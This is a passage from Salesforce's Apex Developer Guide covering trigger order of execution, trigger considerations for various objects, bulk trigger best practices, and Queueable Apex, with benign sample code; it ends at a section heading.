_Apex Developer Guide_ page contains the most up-to-date information on the order of execution for this API version. To access a
[different API version, use the version picker for the Apex Developer Guide.](https://developer.salesforce.com/docs/atlas.en-us.262.0.apexcode.meta/apexcode/apex_dev_guide.htm)

On the server, Salesforce performs events in this sequence.

Note: During a recursive save, Salesforce skips steps 9 (assignment rules) through 17 (roll-up summary field in the grandparent
record).

**1.** Loads the original record from the database or initializes the record for an `upsert` statement.

**2.** Loads the new record field values from the request and overwrites the old values.

Salesforce performs different validation checks depending on the type of request.

**•** For requests from a standard UI edit page, Salesforce runs these system validation checks on the record:

**–** Compliance with layout-specific rules

**–** Required values at the layout level and field-definition level

**–** Valid field formats

**–** Maximum field length

Additionally, if the request is from a User object on a standard UI edit page, Salesforce runs custom validation rules.

**•** For requests from multiline item creation such as quote line items and opportunity line items, Salesforce runs custom validation
rules.

**•** For requests from other sources such as an Apex application or a SOAP API call, Salesforce validates foreign keys, field formats,
maximum field lengths, and restricted picklists. Before executing a trigger, Salesforce verifies that any custom foreign keys don’t
refer to the object itself.

**3.** Executes record-triggered flows that are configured to run before the record is saved.

**4.** Executes all `before` triggers.


Apex Developer Guide Invoking Apex

**5.** Runs most system validation steps again, such as verifying that all required fields have a non- `null` value, and runs any custom
validation rules. The only system validation that Salesforce doesn't run a second time (when the request comes from a standard UI
edit page) is the enforcement of layout-specific rules.

**6.** Executes duplicate rules. If the duplicate rule identifies the record as a duplicate and uses the block action, the record isn’t saved
and no further steps, such as `after` triggers and workflow rules, are taken.

**7.** Saves the record to the database, but doesn't commit yet.

**8.** Executes all `after` triggers.

**9.** Executes assignment rules.

**10.** Executes auto-response rules.

**11.** Executes workflow rules. If there are workflow field updates:

Note: This sequence applies only to workflow rules.

**a.** Updates the record again.

**b.** Runs system validations again. Custom validation rules, flows, duplicate rules, processes built with Process Builder, and escalation
rules aren’t run again.

**c.** Executes `before update` triggers and `after update` triggers, regardless of the record operation (insert or update),
one more time (and only one more time)

**12.** Executes escalation rules.

**13.** Executes these Salesforce Flow automations, but not in a guaranteed order.

**•** Processes built with Process Builder

**•** Flows launched by workflow rules (flow trigger workflow actions pilot)

[Note: To control the order of execution of Salesforce Flow automations, use record-triggered flows. See Manage](https://help.salesforce.com/s/articleView?id=platform.flow_trigger_explorer.htm&type=5&language=en_US)
[Record-Triggered Flows](https://help.salesforce.com/s/articleView?id=platform.flow_trigger_explorer.htm&type=5&language=en_US)

When a process or flow executes a DML operation, the affected record goes through the save procedure.

**14.** Executes record-triggered flows that are configured to run after the record is saved

**15.** Executes entitlement rules.

**16.** If the record contains a roll-up summary field or is part of a cross-object workflow, performs calculations and updates the roll-up
summary field in the parent record. Parent record goes through save procedure.

**17.** If the parent record is updated, and a grandparent record contains a roll-up summary field or is part of a cross-object workflow,
performs calculations and updates the roll-up summary field in the grandparent record. Grandparent record goes through save
procedure.

**18.** Executes Criteria Based Sharing evaluation.

**19.** Commits all DML operations to the database.

**20.** After the changes are committed to the database, executes post-commit logic. Examples of post-commit logic (in no particular
order) include:

**•** Sending email

**•** Enqueued asynchronous Apex jobs, including queueable jobs and future methods

**•** Asynchronous paths in record-triggered flows


Apex Developer Guide Invoking Apex

Additional Considerations

Note these considerations when working with triggers.

**•** If a workflow rule field update is triggered by a record update, `Trigger.old` doesn’t hold the newly updated field by the workflow
after the update. Instead, `Trigger.old` holds the object before the initial record update was made. For example, an existing
record has a number field with an initial value of 1. A user updates this field to 10, and a workflow rule field update fires and increments
it to 11. In the `update` trigger that fires after the workflow field update, the field value of the object obtained from `Trigger.old`
[is the original value of 1, and not 10. See Trigger.old values before and after update triggers.](https://help.salesforce.com/apex/HTViewSolution?urlname=Understanding-Trigger-old-and-Trigger-new-values-in-before-after-update-triggers-1327108323938&language=en_US)

**•** If a DML call is made with partial success allowed, triggers are fired during the first attempt and are fired again during subsequent
attempts. Because these trigger invocations are part of the same transaction, static class variables that are accessed by the trigger
aren't reset. See Bulk DML Exception Handling.

**•** If more than one trigger is defined on an object for the same event, the order of trigger execution isn't guaranteed. For example, if
you have two `before insert` triggers for Case and a new Case record is inserted. The firing order of these two triggers isn’t
guaranteed.

**•** To learn about the order of execution when you insert a non-private contact in your org that associates a contact to multiple accounts,
[see AccountContactRelation.](https://developer.salesforce.com/docs/atlas.en-us.262.0.object_reference.meta/object_reference/sforce_api_objects_accountcontactrelation.htm)

**•** To learn about the order of execution when you’re using `before` triggers to set `Stage` and `Forecast Category`, see
[Opportunity.](https://developer.salesforce.com/docs/atlas.en-us.262.0.object_reference.meta/object_reference/sforce_api_objects_opportunity.htm)

**•** In API version 53.0 and earlier, after-save record-triggered flows run after entitlements are executed.

SEE ALSO:

_Salesforce Help_ [: Triggers for Autolaunched Flows](https://help.salesforce.com/s/articleView?id=platform.flow_concepts_trigger.htm&type=5&language=en_US)

##### Operations That Don't Invoke Triggers

Some operations don’t invoke triggers.

Triggers are invoked for Data Manipulation Language (DML) operations that the Java application server initiates or processes. Therefore,
some system bulk operations don't invoke triggers. Some examples include:

Note: Inserts, updates, and deletes on person accounts fire Account triggers, not Contact triggers.

**•** Cascading delete operations. Only records that initiate a `delete` cause trigger evaluation.

**•** Cascading updates of child records that are reparented as a result of a merge operation

**•** Mass campaign status changes

**•** Mass division transfers

**•** Mass address updates

**•** Mass approval request transfers

**•** Mass email actions

**•** Modifying custom field data types

**•** Renaming or replacing picklists

**•** Managing price books

**•** Changing a user's default division with the transfer division option checked

**•** Changes to these objects:

**–** BrandTemplate

**–** MassEmailTemplate


Apex Developer Guide Invoking Apex

**–** Folder

**•** Update account triggers don't fire before or after a business account record type changes to person account. They also don’t fire
before or after a person account record type changes to business account.

**•** Update triggers don’t fire on `FeedItem` when the `LikeCount` counter increases.

The `before` triggers associated with these operations fire during lead conversion only if validation and triggers for lead conversion
are enabled in the organization:

**•** `insert` of accounts, contacts, and opportunities

**•** `update` of accounts and contacts

Opportunity triggers don’t fire when:

**•** The account owner changes as a result of the associated opportunity’s owner changing.

**•** The opportunity owner changes as a result of the associated account’s owner changing.

The `before` and `after` triggers and the validation rules don't fire for an opportunity when:

**•** You modify an opportunity product on an opportunity.

**•** An opportunity product schedule changes an opportunity product, even if the opportunity product changes the opportunity.

However, roll-up summary fields do get updated, and workflow rules associated with the opportunity do run.

The `getContent` and `getContentAsPDF` PageReference methods aren't allowed in triggers.

Note the following for the ContentVersion object:

**•** Content pack operations involving the ContentVersion object, including slides and slide autorevision, don't invoke triggers.

Note: Content packs are revised when a slide inside the pack is revised.

**•** Values for the `TagCsv` and `VersionData` fields are only available in triggers if the request to create or update ContentVersion
records originates from the API.

**•** You can't use `before` or `after delete` triggers with the ContentVersion object.

Triggers on the Attachment object don’t fire when:

**•** The attachment is created via Case Feed publisher.

**•** The user sends email via the Email related list and adds an attachment file.

Triggers fire when the Attachment object is created via Email-to-Case or via the UI.

##### Entity and Field Considerations in Triggers

When you create triggers, consider the behavior of certain entities, fields, and operations.

QuestionDataCategorySelection Entity Not Available in After Insert Triggers

The `after insert` trigger that fires after inserting one or more `Question` records doesn’t have access to the
`QuestionDataCategorySelection` records that are associated with the inserted `Question` s. For example, the following
query doesn’t return any results in an `after insert` trigger:

```
   QuestionDataCategorySelection[] dcList =

   [select Id,DataCategoryName from QuestionDataCategorySelection where ParentId IN :questions];

```


Apex Developer Guide Invoking Apex

Fields Not Updateable in Before Triggers

Some field values are set during the system save operation, which occurs after `before` triggers have fired. As a result, these fields
cannot be modified or accurately detected in `before insert` or `before update` triggers. Some examples include:

**•** `Task.isClosed`

**•** `Opportunity.amount`   

**•** `Opportunity.ForecastCategory`

**•** `Opportunity.isWon`

**•** `Opportunity.isClosed`

**•** `Contract.activatedDate`

**•** `Contract.activatedById`

**•** `Case.isClosed`

**•** `Solution.isReviewed`

**•** `Id` (for all records)**

**•** `createdDate` (for all records)**

**•** `lastUpdated` (for all records)

**•** `Event.WhoId` (when Shared Activities is enabled)

**•** `Task.WhoId` (when Shared Activities is enabled)

   - When `Opportunity` has no `lineitems`, `Amount` can be modified by a `before` trigger.

** `Id` and `createdDate` can be detected in `before update` triggers, but cannot be modified.

Fields Not Updateable in After Triggers

The following fields can’t be updated by `after insert` or `after update` triggers.

**•** `Event.WhoId`

**•** `Task.WhoId`

Considerations for Event DateTime Fields in Insert and Update Triggers

We recommend using the following date and time fields to create or update events.

**•** When creating or updating a timed Event, use `ActivityDateTime` to avoid issues with inconsistent date and time values.

**•** When creating or updating an all-day Event, use `ActivityDate` to avoid issues with inconsistent date and time values.

**•** We recommend that you use `DurationInMinutes` because it works with all updates and creates for Events.

Operations Not Supported in Insert and Update Triggers

The following operations aren’t supported in `insert` and `update` triggers.

**•** Manipulating an activity relation through the `TaskRelation` or `EventRelation` object, if Shared Activities is enabled

**•** Manipulating an invitee relation on a group event through the `Invitee` object, whether or not Shared Activities is enabled

Entities Not Supported in After Undelete Triggers

Certain objects can’t be restored, and therefore, shouldn’t have `after undelete` triggers.

**•** CollaborationGroup


Apex Developer Guide Invoking Apex

**•** CollaborationGroupMember

**•** FeedItem

**•** FeedComment

Considerations for Update Triggers

Field history tracking honors the permissions of the current user. If the current user doesn’t have permission to directly edit an object or
field, but the user activates a trigger that changes an object or field with history tracking enabled, no history of the change is recorded.

Considerations for the Salesforce Side Panel for Salesforce for Outlook

When an email is associated to a record using the Salesforce Side Panel for Salesforce for Outlook, the email associations are represented
in the `WhoId` or `WhatId` fields on a task record. Associations are completed after the task is created, so the `Task.WhoId` and
`Task.WhatId` fields aren’t immediately available in `before` or `after` Task triggers for insert and update events, and their values
are initially `null` . The `WhoId` and `WhatId` fields are set on the saved task record in a subsequent operation, however, so their values
can be retrieved later.

SEE ALSO:

##### Triggers for Chatter Objects Triggers for Chatter Objects

You can write triggers for the FeedItem and FeedComment objects.

Trigger Considerations for FeedItem, FeedAttachment, and FeedComment

**•** Only FeedItems of type `TextPost`, `QuestionPost`, `LinkPost`, `HasLink`, `ContentPost`, and `HasContent` can be
inserted, and therefore invoke the `before` or `after insert` trigger. User status updates don't cause the FeedItem triggers
to fire.

**•** While FeedPost objects were supported for API versions 18.0, 19.0, and 20.0, don't use any insert or delete triggers saved against
versions before 21.0.

**•** For FeedItem, the following fields aren’t available in the `before insert` trigger:

**–** `ContentSize`

**–** `ContentType`

In addition, the `ContentData` field isn’t available in any delete trigger.

**•** Triggers on FeedItem objects run before their attachment and capabilities information is saved, which means that
`ConnectApi.FeedItem.attachment` information and `ConnectApi.FeedElement.capabilities` information
may not be available in the trigger.

The attachment and capabilities information may not be available from these methods:
`ConnectApi.ChatterFeeds.getFeedItem`, `ConnectApi.ChatterFeeds.getFeedElement`,
`ConnectApi.ChatterFeeds.getFeedPoll`, `ConnectApi.ChatterFeeds.getFeedElementPoll`,
`ConnectApi.ChatterFeeds.postFeedItem`, `ConnectApi.ChatterFeeds.postFeedElement`,
`ConnectApi.ChatterFeeds.shareFeedItem`, `ConnectApi.ChatterFeeds.shareFeedElement`,
`ConnectApi.ChatterFeeds.voteOnFeedPoll`, and `ConnectApi.ChatterFeeds.voteOnFeedElementPoll`


Apex Developer Guide Invoking Apex

**•** FeedAttachment isn’t a triggerable object. You can access feed attachments in FeedItem _update_ triggers through a SOQL query. For
example:

```
     trigger FeedItemTrigger on FeedItem (after update) {

       List<FeedAttachment> attachments = [SELECT Id, Title, Type, FeedEntityId

                              FROM FeedAttachment

                              WHERE FeedEntityId IN :Trigger.new ];

       for (FeedAttachment attachment : attachments) {

          System.debug(attachment.Type);

       }

     }

```

**•** When you insert a feed item with associated attachments, the FeedItem is inserted first, then the FeedAttachment records are
created. On update of a feed item with associated attachments, the FeedAttachment records are inserted first, then the FeedItem
is updated. As a result of this sequence of operations, in Salesforce Classic FeedAttachment is available in `Update` and
`AfterInsert` triggers. When the attachment is done through Lightning Experience, it’s available in both the `Update` and
`AfterInsert` triggers; but in the `AfterInsert` trigger, use the future method to access FeedAttachments.

**•** The following feed attachment operations cause the FeedItem _update_ triggers to fire.

**–** A FeedAttachment is added to a FeedItem and causes the FeedItem type to change.

**–** A FeedAttachment is removed from a FeedItem and causes the FeedItem type to change.

**•** FeedItem triggers aren’t fired when inserting or updating a FeedAttachment that doesn’t cause a change on the associated FeedItem.

**•** You can’t insert, update, or delete FeedAttachments in _before update_ and _after update_ FeedItem triggers.

**•** For FeedComment _before insert_ and _after insert_ triggers, the fields of a ContentVersion associated with the FeedComment (obtained
through `FeedComment.RelatedRecordId` ) aren’t available.

Other Chatter Trigger Considerations

**•** Apex code uses extra security when executing in a Chatter context. To post to a private group, the user running the code must be
a member of that group. If the running user isn't a member, you can set the `CreatedById` field to be a member of the group in
the FeedItem record.

**•** When CollaborationGroupMember is updated, CollaborationGroup is automatically updated as well to ensure that the member
count is correct. As a result, when CollaborationGroupMember `update` or `delete` triggers run, CollaborationGroup `update`
triggers run as well.

SEE ALSO:

Entity and Field Considerations in Triggers

_[Object Reference for Salesforce and Lightning Platform](https://developer.salesforce.com/docs/atlas.en-us.262.0.object_reference.meta/object_reference/sforce_api_objects_feeditem.htm)_ : FeedItem

_[Object Reference for Salesforce and Lightning Platform](https://developer.salesforce.com/docs/atlas.en-us.262.0.object_reference.meta/object_reference/sforce_api_objects_feedattachment.htm)_ : FeedAttachment

_[Object Reference for Salesforce and Lightning Platform](https://developer.salesforce.com/docs/atlas.en-us.262.0.object_reference.meta/object_reference/sforce_api_objects_feedcomment.htm)_ : FeedComment

_[Object Reference for Salesforce and Lightning Platform](https://developer.salesforce.com/docs/atlas.en-us.262.0.object_reference.meta/object_reference/sforce_api_objects_collaborationgroup.htm)_ : CollaborationGroup

_[Object Reference for Salesforce and Lightning Platform](https://developer.salesforce.com/docs/atlas.en-us.262.0.object_reference.meta/object_reference/sforce_api_objects_collaborationgroupmember.htm)_ : CollaborationGroupMember


Apex Developer Guide Invoking Apex

##### Trigger Considerations for Knowledge Articles

You can write triggers for KnowledgeArticleVersion objects. Learn when you can use triggers, and which actions don’t fire triggers, like
archiving articles.

In general, KnowledgeArticleVersion (KAV) records can use these triggers:

**•** Creating a KAV record calls the `before insert` and `after insert` triggers. This includes creating an article, and creating
drafts from archived, published, and master-language articles using the Restore, Edit as Draft, and Submit for Translation actions.

**•** Editing an existing KAV record calls the `before update` and `after update` triggers.

**•** Deleting a KAV record calls the `before delete` and `after delete` triggers.

**•** Importing articles calls the `before insert` and `after insert` triggers. Importing articles with translations also calls the
`before update` and `after update` triggers.

Actions that change the publication status of a KAV record, such as Publish and Archive, do not fire Apex or flow triggers. However,
sometimes publishing an article from the UI causes the article to be saved, and in these instances the `before update` and `after`
`update` triggers are called.

Knowledge Actions and Apex Triggers

Consider the following when writing Apex triggers for actions on KnowledgeArticleVersion:

**Save, Save and Close**
When an article is saved, the `before update` and `after update` triggers are called. When a new article is saved for the
first time, the `before insert` and `after insert` triggers work instead.

**Edit, Edit as Draft**

**•** When a draft translation is edited, you can use the `before update` and `after update` triggers.

**•** The Edit as Draft action creates a draft from a published article, so the `before insert` and `after insert` triggers fire.

**•** In Salesforce Classic, no triggers fire when a draft master-language article is edited.

**•** In Salesforce Classic, the `before insert` and `after insert` triggers are called when editing an archived article from
the Article Management tab. This creates a draft KAV record.

**Cancel, Delete**

The `before delete` and `after delete` triggers are called in these cases:

**•** When deleting a translation draft.

**•** From the Article Management or Knowledge tab in Salesforce Classic, after editing a published article and then clicking Cancel.
This deletes the new draft.

**Submit for Translation**
This action creates a draft translation, so you can generally use the `before insert` and `after insert` triggers. In Salesforce
Classic, you can use the `before update` and `after update` triggers when you create a new article from the Knowledge
tab, save it, and then submit for translation. The `before update` and `after update` triggers fire when the master-language
article is currently being edited, but not from list views or when viewing the article.

**Assign**
The `before update` and `after update` triggers are called only when doing so causes a record save first. This happens
when the article is being edited before the Assign button is clicked.

Actions That Don’t Fire Triggers

These actions can’t fire Apex triggers:


Apex Developer Guide Invoking Apex

**•** Undelete articles from the recycle bin.

**•** Preview and archive articles.

Impact on Lightning Migration

Migrating from Knowledge in Salesforce Classic to Lightning Knowledge affects Apex triggers. Writing an Apex trigger on
KnowledgeArticleVersion objects creates dependencies and prevents the KAV object from being deleted. When you migrate an org with
multiple article types to Lightning Knowledge, you must remove any Apex triggers that reference the KAV article types. During migration,
admins see an error message if Apex triggers still reference the article type KAV objects that are deleted during migration. If you cancel
Lightning Knowledge migration while Apex triggers exist that refer to the new KAV object, admins are notified and you must remove
the Apex code.

Sample Knowledge Trigger

For example, you can define a trigger that enters summary text when an article is created.

```
   trigger KAVTrigger on KAV_Type__kav (before insert) {

      for (KAV_Type__kav kav : Trigger.New) {

        kav.Summary__c = 'Updated article summary before insert';

      }

   }

##### Trigger Exceptions

```

Triggers can be used to prevent DML operations from occurring by calling the `addError()` method on a record or field. When used
on `Trigger.new` records in `insert` and `update` triggers, and on `Trigger.old` records in `delete` triggers, the custom
error message is displayed in the application interface and logged.

Note: Users experience less of a delay in response time if errors are added to `before` triggers.

A subset of the records being processed can be marked with the `addError()` method:

**•** If the trigger was spawned by a DML statement in Apex, any one error results in the entire operation rolling back. However, the
runtime engine still processes every record in the operation to compile a comprehensive list of errors.

**•** If the trigger was spawned by a bulk DML call in the Lightning Platform API, the runtime engine sets aside the bad records and
attempts to do a partial save of the records that did not generate errors. See Bulk DML Exception Handling on page 166.

If a trigger ever throws an unhandled exception, all records are marked with an error and no further processing takes place.

SEE ALSO:

_[Apex Reference Guide](https://developer.salesforce.com/docs/atlas.en-us.262.0.apexref.meta/apexref/apex_methods_system_sobject.htm)_ : SObject.addError()

##### Trigger and Bulk Request Best Practices

A common development pitfall is the assumption that trigger invocations never include more than one record. Apex triggers are optimized
to operate in bulk, which, by definition, requires developers to write logic that supports bulk operations.


Apex Developer Guide Invoking Apex

This is an example of a flawed programming pattern. It assumes that only one record is pulled in during a trigger invocation. While this
might support most user interface events, it does not support bulk operations invoked through SOAP API or Visualforce.

```
   trigger MileageTrigger on Mileage__c (before insert, before update) {

     User c = [SELECT Id FROM User WHERE mileageid__c = :Trigger.new[0].id];

   }

```

This is another example of a flawed programming pattern. It assumes that fewer than 100 records are in scope during a trigger invocation.
If more than 100 queries are issued, the trigger would exceed the SOQL query limit.

```
   trigger MileageTrigger on Mileage__c (before insert, before update) {

     for(mileage__c m : Trigger.new){

       User c = [SELECT Id FROM user WHERE mileageid__c = :m.Id];

     }

   }

```

For more information on governor limits, see Execution Governors and Limits.

This example demonstrates the correct pattern to support the bulk nature of triggers while respecting the governor limits:

```
   Trigger MileageTrigger on Mileage__c (before update) {

     Set<ID> ids = Trigger.newMap.keySet();

     List<User> c = [SELECT Id FROM user WHERE mileageid__c in :ids];

   }

```

This pattern respects the bulk nature of the trigger by passing the `Trigger.new` collection to a set, then using the set in a single
SOQL query. This pattern captures all incoming records within the request while limiting the number of SOQL queries.

Best Practices for Designing Bulk Programs

The following are the best practices for this design pattern:

**•** Minimize the number of data manipulation language (DML) operations by adding records to collections and performing DML
operations against these collections.

**•** Minimize the number of SOQL statements by preprocessing records and generating sets, which can be placed in single SOQL
statement used with the `IN` clause.

SEE ALSO:

Developing Code in the Cloud

#### Asynchronous Apex

Apex offers multiple ways for running your Apex code asynchronously. Choose the asynchronous Apex feature that best suits your needs.

This table lists the asynchronous Apex features and when to use each.


Apex Developer Guide Invoking Apex

##### Queueable Apex Take control of your asynchronous Apex processes by using the Queueable interface. Salesforce recommends that you use Queueable Apex instead of Apex future methods. Queueables have the same use cases as future methods but offer extra benefits,

including job IDs, support for non-primitive types, and job chaining.

Apex Scheduler
Use the Apex Scheduler to delay execution so that you can run Apex classes at a specified time. This is ideal for daily or weekly
maintenance tasks using Batch Apex.

Batch Apex

Future Methods
A future method runs asynchronously. You can call a future method to run long-running operations, such as callouts to external
web services or any operation that you want to run in its own thread. You can also use future methods to isolate Data Manipulation
Language (DML) operations on different sObject types to prevent the mixed DML error. Each future method is queued and runs
when system resources become available. That way, the execution of your code doesn’t wait for the completion of a long-running
operation. A benefit of future methods is that some governor limits are higher, such as SOQL query limits and heap size limits.

##### Queueable Apex Take control of your asynchronous Apex processes by using the Queueable interface. Salesforce recommends that you use Queueable

Apex instead of Apex future methods. Queueables have the same use cases as future methods but offer extra benefits, including job
IDs, support for non-primitive types, and job chaining.

Apex processes that run for a long time, such as extensive database operations or external web service callouts, can be run asynchronously
##### by implementing the Queueable interface and adding a job to the Apex job queue. In this way, your asynchronous Apex job runs

in the background in its own thread and doesn’t delay the execution of your main Apex logic. Each queued job runs when system
##### resources become available. A benefit of using the Queueable interface methods is that some governor limits are higher than for

synchronous Apex, such as heap size limits.

Important: If an Apex transaction rolls back, any queueable jobs queued for execution by the transaction aren’t processed.

Queueable jobs are similar to future methods in that they’re both queued for execution, but they provide you with these additional
benefits.


Apex Developer Guide Invoking Apex

**•** Getting an ID for your job: When you submit your job by invoking the `System.enqueueJob` method, the method returns the
ID of the new job. This ID corresponds to the ID of the AsyncApexJob record. Use this ID to identify and monitor your job, either
through the Salesforce UI (Apex Jobs page), or programmatically by querying your record from AsyncApexJob.

**•** Using non-primitive types: Your queueable class can contain member variables of non-primitive data types, such as sObjects or
custom Apex types. Those objects can be accessed when the job executes.

**•** Chaining jobs: You can chain one job to another job by starting a second job from a running job. Chaining jobs is useful if your
process depends on another process to have run first.

You can set a maximum stack depth of chained Queueable jobs, overriding the default limit of five in Developer and Trial Edition
organizations.

Note: Variables that are declared `transient` are ignored by serialization and deserialization and the value is set to null in
Queueable Apex.

Adding a Queueable Job to the Asynchronous Execution Queue

This example implements the `Queueable` interface. The `execute` method in this example inserts a new account. The
`System.enqueueJob(queueable)` method is used to add the job to the queue.

```
   public with sharing class AsyncExecutionExample implements Queueable {

      public void execute(QueueableContext context) {

        Account a = new Account(Name='Acme',Phone='(415) 555-1212');

        insert as user a;

      }

   }

```

To add this class as a job on the queue, call this method:

```
   ID jobID = System.enqueueJob(new AsyncExecutionExample());

```

Important: When you call `System.enqueueJob`, Salesforce adds the process to the queue. Actual execution can be delayed
based on service availability.

After you submit your queueable class for execution, the job is added to the queue and will be processed when system resources become
available. You can monitor the status of your job programmatically by querying AsyncApexJob or through the user interface in Setup
by entering _`Apex Jobs`_ in the `Quick Find` box, then selecting **Apex Jobs** .

To query information about your submitted job, perform a SOQL query on AsyncApexJob by filtering on the job ID that the
`System.enqueueJob` method returns. This example uses the jobID variable that was obtained in the previous example.

```
   AsyncApexJob jobInfo = [SELECT Status,NumberOfErrors FROM AsyncApexJob WHERE Id = :jobID

   WITH USER_MODE];

```

Similar to future jobs, queueable jobs don’t process batches, and so the number of processed batches and the number of total batches
are always zero.

Adding a Queueable Job with a Specified Minimum Delay

Use the `System.enqueueJob(queueable, delay)` method to add queueable jobs to the asynchronous execution queue
with a specified minimum delay (0–10 minutes). The delay is ignored during Apex testing.

See `[System.enqueueJob(queueable, delay)](https://developer.salesforce.com/docs/atlas.en-us.262.0.apexref.meta/apexref/apex_methods_system_system.htm#apex_System_System_enqueueJob_2)` in the _Apex Reference Guide_ .

Warning: When you set the delay to 0 (zero), the queueable job is run as quickly as possible. With chained queueable jobs,
implement a mechanism to slow down or halt the job if necessary. Without such a fail-safe mechanism in place, you can rapidly
reach the daily async Apex limit.


Apex Developer Guide Invoking Apex

In the following cases, it would be beneficial to adjust the timing before the queueable job is run.

**•** If the external system is rate-limited and can be overloaded by chained queueable jobs that are making rapid callouts.

**•** When polling for results, and executing too fast can cause wasted usage of the daily async Apex limits.

This example adds a job for delayed asynchronous execution by passing in an instance of your class implementation of the `Queueable`
interface for execution. There’s a minimum delay of 5 minutes before the job is executed.

```
   Integer delayInMinutes = 5;

   ID jobID = System.enqueueJob(new MyQueueableClass(), delayInMinutes);

```

Admins can define a default org-wide delay (1–600 seconds) in scheduling queueable jobs that were scheduled without a delay parameter.
Use the delay setting as a mechanism to slow default queueable job execution. If the setting is omitted, Apex uses the standard queueable
timing with no added delay.

Note: Using the `System.enqueueJob(queueable, delay)` method ignores any org-wide enqueue delay setting.

Define the org-wide delay in one of these ways.

**•** From Setup, in the Quick Find box, enter _`Apex Settings`_, and then enter a value (1–600 seconds) for **Default minimum**
**enqueue delay (in seconds) for queueable jobs that do not have a delay parameter**

**•** [To enable this feature programmatically with Metadata API, see ApexSettings in the](https://developer.salesforce.com/docs/atlas.en-us.262.0.api_meta.meta/api_meta/meta_apexsettings.htm) _Metadata API Developer Guide_ .

Adding a Queueable Job with a Specified Stack Depth

Use the `System.enqueueJob(queueable, asyncOptions)` method where you can specify the maximum stack depth
and the minimum queue delay in the asyncOptions parameter.

The `[System.AsyncInfo](https://developer.salesforce.com/docs/atlas.en-us.262.0.apexref.meta/apexref/apex_class_System_AsyncOptions.htm)` class properties contain the current and maximum stack depths and the minimum queueable delay.

The `[System.AsyncInfo](https://developer.salesforce.com/docs/atlas.en-us.262.0.apexref.meta/apexref/apex_class_System_AsyncInfo.htm)` class has methods to help you determine if maximum stack depth is set in your Queueable request and
to get the stack depths and queue delay for your queueables that are currently running. Use information about the current queueable
execution to make decisions on adjusting delays on subsequent calls.

These are methods in the `System.AsyncInfo` class.

**•** `hasMaxStackDepth()`

**•** `getCurrentQueueableStackDepth()`

**•** `getMaximumQueueableStackDepth()`

**•** `getMinimumQueueableDelayInMinutes()`

This example uses stack depth to terminate a chained job and prevent it from reaching the daily maximum number of asynchronous
Apex method executions.

```
   // Fibonacci

   public with sharing class FibonacciDepthQueueable implements Queueable {

      private long nMinus1, nMinus2;

      public static void calculateFibonacciTo(integer depth) {

        AsyncOptions asyncOptions = new AsyncOptions();

        asyncOptions.MaximumQueueableStackDepth = depth;

        System.enqueueJob(new FibonacciDepthQueueable(null, null), asyncOptions);

      }

      private FibonacciDepthQueueable(long nMinus1param, long nMinus2param) {

        nMinus1 = nMinus1param;

```


Apex Developer Guide Invoking Apex

```
        nMinus2 = nMinus2param;

      }

      public void execute(QueueableContext context) {

        integer depth = AsyncInfo.getCurrentQueueableStackDepth();

        // Calculate step

        long fibonacciSequenceStep;

        switch on (depth) {

           when 1, 2 {

             fibonacciSequenceStep = 1;

           }

           when else {

             fibonacciSequenceStep = nMinus1 + nMinus2;

           }

        }

       System.debug('depth: ' + depth + ' fibonacciSequenceStep: ' + fibonacciSequenceStep);

        if(System.AsyncInfo.hasMaxStackDepth() &&

          AsyncInfo.getCurrentQueueableStackDepth() >=

          AsyncInfo.getMaximumQueueableStackDepth()) {

           // Reached maximum stack depth

           Fibonacci__c result = new Fibonacci__c(

             Depth__c = depth,

             Result = fibonacciSequenceStep

             );

           insert as user result;

        } else {

         System.enqueueJob(new FibonacciDepthQueueable(fibonacciSequenceStep, nMinus1));

        }

      }

   }

```

Testing Queueable Jobs

This example shows how to test the execution of a queueable job in a test method. A queueable job is an asynchronous process. To
make sure that this process runs within the test method, the job is submitted to the queue between the `Test.startTest` and
`Test.stopTest` block. The system executes all asynchronous processes started in a test method synchronously after the
`Test.stopTest` statement. Next, the test method verifies the results of the queueable job by querying the account that the job
created.

```
   @IsTest

   public with sharing class AsyncExecutionExampleTest {

      @IsTest

      static void test1() {

        // startTest/stopTest block to force async processes

        // to run in the test.

        Test.startTest();

        System.enqueueJob(new AsyncExecutionExample());

        Test.stopTest();

```


Apex Developer Guide Invoking Apex

```
        // Validate that the job has run

        // by verifying that the record was created.

        // This query returns only the account created in test context by the

        // Queueable class method.

        Account acct = [SELECT Name,Phone FROM Account WHERE Name='Acme' LIMIT 1 WITH

   USER_MODE];

        Assert.isNotNull(acct);

        Assert.areEqual('(415) 555-1212', acct.Phone);

      }

   }

```

Chaining Jobs

To run a job after some other processing is done first by another job, you can chain queueable jobs. To chain a job to another job, submit
the second job from the `execute()` method of your queueable class. You can add only one job from an executing job, which means
that only one child job can exist for each parent job. For example, if you have a second class called `SecondJob` that implements the
`Queueable` interface, you can add this class to the queue in the `execute()` method as follows:

```
   public with sharing class AsyncExecutionExample implements Queueable {

      public void execute(QueueableContext context) {

        // Your processing logic here

        // Chain this job to next job by submitting the next job

        System.enqueueJob(new SecondJob());

      }

   }

```

Note: Apex allows HTTP and web service callouts from queueable jobs, if they implement the `Database.AllowsCallouts`
marker interface. In queueable jobs that implement this interface, callouts are also allowed in chained queueable jobs.

You can test chained queueable jobs by using appropriate stack depths, but be aware of applicable Apex governor limits. See Adding
a Queueable Job with a Specified Stack Depth.

Queueable Apex Limits

**•** The execution of a queued job counts one time against the shared limit for asynchronous Apex method executions. See Lightning
Platform Apex Limits.

**•** You can add up to 50 jobs to the queue with `System.enqueueJob` in a single transaction. In asynchronous transactions (for
example, from a batch Apex job), you can add only one job to the queue with `System.enqueueJob` . To check how many
queueable jobs have been added in one transaction, call `[Limits.getQueueableJobs()](https://developer.salesforce.com/docs/atlas.en-us.262.0.apexref.meta/apexref/apex_methods_system_limits.htm)` .

**•** Because no limit is enforced on the depth of chained jobs, you can chain one job to another. You can repeat this process with each
new child job to link it to a new child job. For Developer Edition and Trial organizations, the maximum stack depth for chained jobs
is 5, which means that you can chain jobs four times. The maximum number of jobs in the chain is 5, including the initial parent
queueable job.

**•** When chaining jobs with `System.enqueueJob`, you can add only one job from an executing job. Only one child job can exist
for each parent queueable job. Starting multiple child jobs from the same queueable job isn’t supported.

**•** The execution of a queued job counts one time against the shared limit for asynchronous Apex method executions. See [Salesforce](https://developer.salesforce.com/docs/atlas.en-us.262.0.apexcode.meta/apexcode/apex_gov_limits.htm)
[Platform Apex Limits.](https://developer.salesforce.com/docs/atlas.en-us.262.0.apexcode.meta/apexcode/apex_gov_limits.htm)

**•** You can process queueable jobs that exceed the daily shared limit for asynchronous Apex executions at a throttled rate. See Elastic
Limits for Asynchronous Apex Executions (Beta) on page 358.


Apex Developer Guide Invoking Apex

###### Detecting Duplicate Queueable Jobs

